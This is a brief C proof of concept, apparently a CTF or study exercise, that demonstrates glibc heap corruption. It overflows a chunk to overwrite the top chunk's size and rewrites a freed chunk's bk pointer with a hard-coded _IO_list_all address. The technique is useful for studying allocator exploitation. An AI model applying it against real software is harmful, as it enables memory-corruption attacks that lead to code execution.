#include <stdio.h>
#include <stdlib.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stderr,0,2,0);
	setvbuf(stdout,0,2,0);
}

int main()
{
	void *p1,*p2,*p3,*p4;
	long long *ptr;

	setbufs();

	p1=malloc(0x200);
	ptr=(long long)p1+0x200+8;
	*ptr=0xdf1;

	malloc(0x1000);
	p2=malloc(0xd60);

	// now alloc 0x70, 0x60 unsorted bin will be in smallbin list
	ptr=(long long)p2+0xd60+0x10;

	// rewrite the smallbin's bk with _IO_list_all-0x10
	*(ptr+1)=0x7ffff7dd2520-0x10;
	
	malloc(0x50);
	return 0;
	

}
